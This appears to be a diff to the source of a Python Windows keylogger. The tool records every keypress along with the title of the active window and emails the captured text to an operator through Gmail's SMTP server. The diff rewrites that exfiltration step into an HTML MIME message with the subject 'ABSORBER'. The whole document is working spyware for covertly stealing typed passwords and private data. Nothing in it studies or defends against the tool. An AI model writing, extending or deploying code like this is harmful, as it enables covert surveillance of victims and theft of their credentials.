@@ -1,4 +1,8 @@
 from keyboard import on_press, wait
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 from win32gui import GetWindowText, GetForegroundWindow
 import win32event, win32api, winerror
 from datetime import datetime
@@ -9,6 +13,8 @@ import sys
 import shutil
 from winreg import *
 import os
+
+
 
 instance = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
@@ -43,30 +49,31 @@ else:
 data = ''
 lastwindow = ''
 
+
 def send_mail():
-    global data
+    global data,lastwindow
     while True:
         if len(data) > 20:
             timeInSecs = datetime.now()
             PASS = PAS
             FROM = FRM
             TO = FRM
-            SUBJECT = "B33: "
-            MESSAGE =  data 
-
-            message_payload = "\r\n".join((
-                                "From: %s" %FROM,
-                                "To: %s" %TO,
-                                "Subject: %s" %SUBJECT,
-                                "",
-                                MESSAGE))
+            SUBJECT = "ABSORBER"
+            MESSAGE =  '<span style="color:#0000FF">' + ' [' + lastwindow + '] ' + '</span>'+ data 
+            msg = MIMEMultipart()
+            msg.attach(MIMEText(MESSAGE, 'html'))
+            text = msg.as_string()
             try:
                 server = smtplib.SMTP('smtp.gmail.com')
                 server.connect('smtp.gmail.com', '587')
                 server.starttls()
                 server.login(FROM, PASS)
-                server.sendmail(FROM, TO, message_payload)
+                server.sendmail(FROM, TO, text)
+                lastwindow = ''
                 data = ''
+                MESSAGE = ''
+                text = ''
+                msg = ''
                 server.quit()
             except Exception as error:
                 print (error)
@@ -77,7 +84,7 @@ def display(event, key):
     global data, lastwindow
     if lastwindow != GetWindowText(GetForegroundWindow()):
         lastwindow = GetWindowText(GetForegroundWindow())
-        data += ' [ ' + lastwindow + ' ] '
+        #data += ' [ ' + lastwindow + ' ] '
         if key == 'tab' or key == 'caps lock' or key == 'shift' or key == 'ctrl' or key == 'alt' or key == 'space' or key == 'right alt' or key == 'right ctrl' or key == 'esc' or key == 'left' or key == 'right' or key == 'down' or key == 'up' or key == 'right shift' or key == 'enter' or key == 'backspace' or key == 'num lock' or key == 'page up' or key == 'page down' or key == 'insert' or key == 'delete' or key == 'print screen' or key == 'home' or key == 'end' or key == 'decimal':
             data += ' { ' + str(key) + ' } '
         else:
